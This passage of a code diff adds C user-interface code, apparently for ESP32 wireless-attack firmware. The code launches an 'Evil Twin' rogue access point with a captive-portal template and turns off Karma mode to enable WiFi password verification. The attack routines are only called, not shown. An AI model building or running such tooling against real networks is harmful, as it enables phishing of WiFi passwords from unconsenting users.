+            lv_textarea_add_text(evil_twin_log_ta, warn);
+        } else {
+            char msg[120];
+            snprintf(msg, sizeof(msg), "Portal template: %s\n", html_display);
+            lv_textarea_add_text(evil_twin_log_ta, msg);
+        }
+    } else {
+        lv_textarea_add_text(evil_twin_log_ta, "Portal template: (none)\n");
+    }
+
+    wifi_scanner_save_target_bssids();
+
+    // Ensure Karma mode is disabled for Evil Twin (enables WiFi password verification)
+    wifi_attacks_set_karma_mode(false);
+
+    esp_err_t start_res = wifi_attacks_start_evil_twin(ssid, NULL);
+    if (start_res != ESP_OK) {
+        char err[96];
+        snprintf(err, sizeof(err), "Start failed: %s\n", esp_err_to_name(start_res));
+        lv_textarea_add_text(evil_twin_log_ta, err);
+        evil_twin_disable_log_capture();
+        return;
+    }
+
+    lv_textarea_add_text(evil_twin_log_ta, "Evil Twin started. Awaiting log output...\n");
+    lv_textarea_set_cursor_pos(evil_twin_log_ta, LV_TEXTAREA_CURSOR_LAST);
+
+    show_touch_dot = false;
+    if (touch_dot) {
+        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
+    }
+}
